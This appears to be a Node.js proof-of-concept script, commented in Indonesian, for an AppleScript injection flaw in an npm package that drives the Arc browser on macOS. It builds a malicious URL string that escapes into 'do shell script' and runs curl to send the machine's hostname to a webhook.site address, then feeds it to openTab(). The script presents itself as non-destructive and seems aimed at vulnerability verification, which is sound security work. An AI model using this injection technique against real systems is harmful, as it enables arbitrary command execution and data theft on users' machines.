// poc-env.js
// PoC non-destruktif untuk verifikasi AppleScript injection pada macOS + Arc.
const WEBHOOK_URL = process.env.WEBHOOK_URL;
if (!WEBHOOK_URL) {
  console.error("Set environment variable WEBHOOK_URL (contoh: export WEBHOOK_URL='https://webhook.site/8d8f2397-db78-49bd-a4c9-bfc62a38a534')");
  process.exit(1);
}

async function main() {
  try {
    let api;
    try {
      api = require('@kkoscielniak/arc-applescript-api');
    } catch (e) {
      console.error("Paket '@kkoscielniak/arc-applescript-api' tidak bisa di-load. Pastikan sudah di-install dan jalankan di macOS jika ingin menguji Arc API.");
      console.error("Error require:", e && e.message ? e.message : e);
      process.exit(1);
    }

    const { openTab } = api;

    const maliciousUrl =
      'x\" } \\n do shell script \"curl -s "' +
      WEBHOOK_URL +
      '?host=`uname -n`\" \\n tell application \"Arc\" to make new tab with properties {URL: \"y';

    console.log("Mengirim PoC payload ke fungsi openTab() — jika berjalan di macOS + Arc, seharusnya mengirim request ke webhook.");
    try {
      await openTab(maliciousUrl);
      console.log("openTab() dipanggil (tidak ada error sinkron). Periksa webhook untuk request masuk.");
    } catch (e) {
      console.error("openTab() melempar error saat dipanggil — ini bisa normal tergantung environment/izin. Periksa webhook tetap.");
      console.error("Detail error:", e && e.message ? e.message : e);
    }
  } catch (err) {
    console.error("Unhandled error:", err);
  }
}

main();
